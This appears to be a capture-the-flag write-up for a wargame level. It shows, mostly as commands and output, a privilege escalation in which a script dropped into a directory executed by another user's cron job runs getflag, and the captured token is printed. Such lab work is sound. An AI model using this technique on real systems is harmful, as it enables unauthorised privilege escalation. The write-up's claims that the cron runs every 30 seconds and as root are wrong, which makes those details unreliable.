## --------------> Vulnerability

Privilege escalation with script

When we log in as level 5, we receive an automated notification.

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

User flag05 appears to have told us that he set up a cron job to run every 30 seconds (which should round to 1 minute) while the following script is executed as root:


```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```

As we can see, it will loop over all of the files in /opt/openarenaserver and run them in a bash shell.
As a result, we must construct a bash script in that directory and run it as root.
Because the operaneserver script does not return or print the command's output, we must ensure that it is redirected to a file in /tmp.
```
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/token" > /opt/openarenaserver/token
level05@SnowCrash:~$ cat /opt/openarenaserver/token
/bin/getflag > /tmp/token
```
Wait few minutes
```
level05@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
